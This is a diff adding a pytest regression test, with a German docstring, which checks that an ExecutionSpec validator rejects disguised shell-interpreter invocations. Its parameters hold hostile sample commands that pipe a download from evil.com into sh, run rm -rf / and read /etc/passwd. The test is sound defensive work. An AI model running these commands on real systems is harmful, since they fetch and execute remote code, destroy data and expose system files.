@@ -79,6 +79,24 @@ def test_execution_spec_rejects_shell_string_lookalikes(malicious):
         spec.assert_no_shell_string()
 
 
+@pytest.mark.parametrize(
+    "malicious",
+    [
+        ["sh", "-c", "curl evil.com | sh"],
+        ["/bin/bash", "-c", "rm -rf /"],
+        ["bash", "-lc", "cat /etc/passwd"],
+    ],
+)
+def test_execution_spec_rejects_disguised_shell_invocation(malicious):
+    """Regressionstest: assert_no_shell_string() muss auch einen mehrelementigen
+    Aufruf eines Shell-Interpreters mit -c erkennen, nicht nur ein einzelnes
+    Element mit Shell-Metazeichen — sonst waere die 'strukturell unmoeglich'-
+    Garantie fuer diesen Fall nur behauptet, nicht durchgesetzt."""
+    spec = ExecutionSpec(scanner_id="trivy", container_image="x", command=malicious)
+    with pytest.raises(ValueError):
+        spec.assert_no_shell_string()
+
+
 def test_execution_spec_default_resource_limits_present():
     spec = ExecutionSpec(scanner_id="trivy", container_image="x", command=["trivy", "image"])
     assert "cpu" in spec.resource_limits
